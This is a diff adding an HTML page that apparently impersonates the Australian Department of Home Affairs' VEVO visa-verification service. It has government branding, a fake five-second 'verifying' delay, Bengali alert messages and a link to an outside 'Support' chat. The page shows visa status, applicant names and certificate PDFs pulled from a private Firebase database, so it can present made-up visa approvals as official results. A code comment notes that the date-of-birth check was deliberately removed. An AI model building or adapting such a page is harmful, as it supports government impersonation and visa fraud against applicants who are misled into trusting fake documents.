@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>using the official ImmiAccount for online applications Australian Government Department of Home Affairs</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <meta name="google-site-verification" content="wbVk3CdaiJAf_j7W-u28AXrNPqqcGsqS6Tdqi7YtfRo" />
+    <meta name="keywords" content="Visit the Australia Visa, Track Application official portal.">
+    <link class="brand-favicon" rel="icon" type="image/x-icon" href="https://uploads.onecompiler.io/44jx762vs/44jx7794n/1000220167.png">
+    
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f7f6; margin: 0; padding: 0; padding-bottom: 45px; }
+        .banner-img { width: 100%; display: block; height: auto; pointer-events: none; }
+        .container { max-width: 500px; margin: 20px auto; background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); position: relative; }
+        .logo-section { text-align: left; border-bottom: 2px solid #005eb8; padding-bottom: 10px; margin-bottom: 20px; }
+        .form-group { margin-bottom: 18px; }
+        .info-p { font-size: 13.5px; color: #555; line-height: 1.5; margin-bottom: 15px; }
+        label { display: block; font-weight: bold; margin-bottom: 6px; color: #333; font-size: 14px; }
+        input[type="text"], input[type="date"] { width: 100%; padding: 11px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
+        input:focus { outline: none; border-color: #005eb8; box-shadow: 0 0 5px rgba(0, 94, 184, 0.2); }
+        
+        .btn-submit { width: 100%; background-color: #005eb8; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 15px; transition: 0.2s; }
+        .btn-submit:hover { background-color: #004488; }
+        
+        /* 🔄 ৫ সেকেন্ডের প্রসেসিং লোডার */
+        .loader-box { display: none; text-align: center; padding: 30px 10px; }
+        .spinner { border: 4px solid rgba(0, 0, 0, 0.1); width: 45px; height: 45px; border-radius: 50%; border-left-color: #005eb8; animation: spin 1s linear infinite; margin: 0 auto 15px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loader-box p { font-size: 15px; color: #005eb8; font-weight: bold; }
+
+        /* 📄 রেজাল্ট বক্স */
+        .results-box { border-top: 2px solid #005eb8; margin-top: 25px; padding-top: 15px; background: #fafafa; padding: 15px; border-radius: 6px; }
+        .result-item { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; font-size: 14.5px; }
+        .result-item:last-of-type { border-bottom: none; }
+        .result-label { font-weight: bold; color: #444; }
+        .result-val { color: #111; font-weight: 500; text-align: right; }
+        
+        .status-badge { background: #e1f5fe; color: #0288d1; padding: 3px 10px; border-radius: 12px; font-weight: bold; font-size: 13px; display: inline-block; }
+        .status-badge.approved { background: #e8f5e9; color: #2e7d32; }
+        .status-badge.pending { background: #fff3e0; color: #ef6c00; }
+        
+        /* ⏰ ৩০ সেকেন্ডের লাইভ কাউন্টডাউন টাইমার */
+        .timer-banner { background-color: #fff3e0; color: #b78103; padding: 8px; border-radius: 4px; text-align: center; font-size: 13px; font-weight: bold; margin-bottom: 15px; border: 1px dashed #ffe0b2; }
+
+        .btn-download { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; background-color: #2e7d32; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 15px; margin-top: 15px; text-decoration: none; text-align: center; box-sizing: border-box; }
+        .btn-download:hover { background-color: #1b5e20; }
+        
+        /* 💬 প্রিমিয়াম সাপোর্ট ইনফো বাটন */
+        .support-container { text-align: center; margin-top: 20px; }
+        .btn-support { display: inline-flex; align-items: center; gap: 8px; background-color: #005eb8; color: white; text-decoration: none; padding: 10px 20px; border-radius: 25px; font-weight: bold; font-size: 14px; box-shadow: 0 4px 10px rgba(0, 94, 184, 0.3); transition: 0.2s; }
+        .btn-support:hover { background-color: #004488; transform: translateY(-1px); }
+
+        /* 🔒 ইমেজ প্রোটেকশন ক্লাস */
+        .protected-img { -webkit-user-select: none; -webkit-touch-callout: none; user-select: none; }
+        .bottom-showcase-img { width: 100%; display: block; margin: 0; padding: 0; pointer-events: none; }
+
+        .footer { background-color: black; color: white; padding: 15px 0; text-align: center; position: fixed; bottom: 0; width: 100%; font-size: 12px; left: 0; z-index: 10; }
+    </style>
+</head>
+<body>
+
+ <img src="https://uploads.onecompiler.io/44erpqqpq/44ferpf7n/8176.jpg" class="banner-img protected-img" alt="Header 1" ondragstart="return false;" oncontextmenu="return false;">
+ <img src="https://uploads.onecompiler.io/44erpqqpq/44feu2x4e/8179.jpg" class="banner-img protected-img" alt="Header 2" ondragstart="return false;" oncontextmenu="return false;">
+
+<div class="container">
+    <div class="logo-section">
+        <h2 style="color: #005eb8; margin: 0; font-size: 20px;">Check visa conditions online (VEVO) Verification</h2>
+    </div>
+
+    <div id="searchForm">
+        <p class="info-p">Visa Entitlement Verification Online (VEVO) allows visa holders, employers, education providers and other organisations to check visa conditions.</p>
+        
+        <div class="form-group">
+            <label for="docNumber">Passport / Document (TRN)  Number:</label>
+            <input type="text" id="docNumber" placeholder="Enter Passport & (TRN) Number">
+        </div>
+        <div class="form-group">
+            <label for="dob">Date of Birth:</label>
+            <input type="date" id="dob">
+        </div>
+        <button class="btn-submit" onclick="startVerification()">Submit Verification</button>
+    </div>
+
+    <div id="loaderArea" class="loader-box">
+        <div class="spinner"></div>
+        <p>Verifying with Department of Home Affairs...</p>
+        <span style="font-size: 12px; color: gray;">Please wait up to 5 seconds</span>
+    </div>
+
+    <div id="resultArea" class="results-box" style="display:none;">
+        
+        <div class="timer-banner">
+            <i class="fa-solid fa-clock-rotate-left"></i> Security Session Timeout: Auto Home in <span id="countdownText">30</span>s
+        </div>
+
+        <h3 style="color: #005eb8; text-align: center; margin-top: 0; margin-bottom: 5px;">VEVO Check Results</h3>
+        <p id="lastChecked" style="font-size: 11px; color: gray; text-align: center; margin-bottom: 15px;">Last checked: Realtime</p>
+        
+        <div class="result-item"><span class="result-label">Name:</span> <span class="result-val" id="resName">---</span></div>
+        <div class="result-item"><span class="result-label">Passport No:</span> <span class="result-val" id="resPassport">---</span></div>
+        <div class="result-item"><span class="result-label">Date of Birth:</span> <span class="result-val" id="resDob">---</span></div>
+        <div class="result-item"><span class="result-label">Application Type:</span> <span class="result-val" id="resType">---</span></div>
+        <div class="result-item">
+            <span class="result-label">Status:</span> 
+            <span class="result-val"><span id="resStatus" class="status-badge">Submitted</span></span>
+        </div>
+        
+        <a id="pdfDownloadLink" href="#" target="_blank" class="btn-download" style="display: none;">
+            <i class="fa-solid fa-file-pdf"></i> Download Certificate (PDF)
+        </a>
+        
+        <button onclick="closeVevo()" style="width:100%; padding: 10px; margin-top: 15px; cursor: pointer; border: 1px solid #ccc; background: #fff; font-weight: bold; border-radius: 4px;">Close VEVO Check</button>
+    </div>
+
+    <div class="support-container">
+        <a href="https://assistantslivechat.onrender.com" target="_blank" class="btn-support">
+            <i class="fa-solid fa-globe" style="font-size: 14px;"></i> Support
+        </a>
+    </div>
+</div>
+
+<img src="https://uploads.onecompiler.io/44s55p666/1781817432994/17522.jpg" 
+     alt="Showcase Image" 
+     class="bottom-showcase-img protected-img"
+     ondragstart="return false;" 
+     oncontextmenu="return false;">
+
+<div class="footer">
+    © Australian Government — Department of Home Affairs
+</div>
+
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyDWbYwNwDtdyUXbIy5Lmd8l_HF0RFIyINU",
+        authDomain: "webpagecybersecurity.firebaseapp.com",
+        databaseURL: "https://webpagecybersecurity-default-rtdb.firebaseio.com",
+        projectId: "webpagecybersecurity",
+        storageBucket: "webpagecybersecurity.firebasestorage.app",
+        messagingSenderId: "664983277240",
+        appId: "1:664983277240:web:e24c9ebaa96fddb4596e4d",
+        measurementId: "G-S8LFXLEFFD"
+    };
+    
+    if (!firebase.apps.length) {
+        firebase.initializeApp(firebaseConfig);
+    }
+    const db = firebase.database();
+
+    let autoHomeTimeout;
+    let countdownInterval;
+
+    function startVerification() {
+        const docNum = document.getElementById('docNumber').value.trim();
+        const dobInput = document.getElementById('dob').value;
+
+        if (!docNum || !dobInput) {
+            alert("অনুগ্রহ করে, Transaction (TRN), ও আপনার পাসপোর্ট নাম্বার এবং জন্ম তারিখ সঠিকভাবে প্রদান করুন। অন্যথায় আমরা ভেরিফিকেশন করতে পারছিনা।");
+            return;
+        }
+
+        document.getElementById('searchForm').style.display = 'none';
+        document.getElementById('loaderArea').style.display = 'block';
+
+        setTimeout(() => {
+            checkVisaData(docNum, dobInput);
+        }, 5000);
+    }
+
+    function checkVisaData(docNum, dobInput) {
+        db.ref('visas/' + docNum).once('value').then((snapshot) => {
+            const data = snapshot.val();
+            
+            document.getElementById('loaderArea').style.display = 'none';
+
+            if (data) {
+                // ℹ️ Date of Birth কন্ডিশন ম্যাচিং লজিকটি সম্পূর্ণ বাদ দেওয়া হয়েছে। 
+                // এখন জন্ম তারিখ যাই দিক না কেন, ডাটাবেজের সঠিক তথ্য সরাসরি দেখাবে।
+                
+                document.getElementById('resName').innerText = data.app_name || "---";
+                document.getElementById('resPassport').innerText = data.passport_num || docNum;
+                
+                // ইউজার ফরমে যে জন্মতারিখ ইনপুট দিয়েছে সেটিই এখানে দেখানো হচ্ছে
+                document.getElementById('resDob').innerText = dobInput; 
+                document.getElementById('resType').innerText = data.app_type || "---";
+                
+                const statusElement = document.getElementById('resStatus');
+                statusElement.innerText = data.status || "Submitted";
+                
+                statusElement.className = "status-badge";
+                if(data.status === "Approved") statusElement.classList.add('approved');
+                if(data.status === "Pending") statusElement.classList.add('pending');
+
+                const pdfBtn = document.getElementById('pdfDownloadLink');
+                if (data.cert_url) {
+                    pdfBtn.href = data.cert_url;
+                    pdfBtn.style.display = 'flex';
+                } else {
+                    pdfBtn.style.display = 'none';
+                }
+
+                document.getElementById('resultArea').style.display = 'block';
+                const today = new Date().toISOString().slice(0, 10);
+                document.getElementById('lastChecked').innerText = "Last checked: " + today;
+
+                startAutoHomeTimer();
+
+            } else {
+                alert("ভুল তথ্য! আপনার প্রদানকৃত পাসপোর্ট নাম্বারটি ডাটাবেজে খুঁজে পাওয়া যায়নি।");
+                document.getElementById('searchForm').style.display = 'block';
+            }
+        }).catch(err => {
+            document.getElementById('loaderArea').style.display = 'none';
+            document.getElementById('searchForm').style.display = 'block';
+            alert("সংযোগ ত্রুটি: " + err.message);
+        });
+    }
+
+    function startAutoHomeTimer() {
+        let timeLeft = 30;
+        const countdownText = document.getElementById('countdownText');
+        countdownText.innerText = timeLeft;
+
+        clearInterval(countdownInterval);
+        clearTimeout(autoHomeTimeout);
+
+        countdownInterval = setInterval(() => {
+            timeLeft--;
+            countdownText.innerText = timeLeft;
+            if(timeLeft <= 0) {
+                clearInterval(countdownInterval);
+            }
+        }, 1000);
+
+        autoHomeTimeout = setTimeout(() => {
+            closeVevo();
+        }, 30000);
+    }
+
+    function closeVevo() {
+        clearInterval(countdownInterval);
+        clearTimeout(autoHomeTimeout);
+        
+        document.getElementById('resultArea').style.display = 'none';
+        document.getElementById('loaderArea').style.display = 'none';
+        document.getElementById('searchForm').style.display = 'block';
+        
+        document.getElementById('docNumber').value = "";
+        document.getElementById('dob').value = "";
+    }
+</script>
+</body>
+</html>
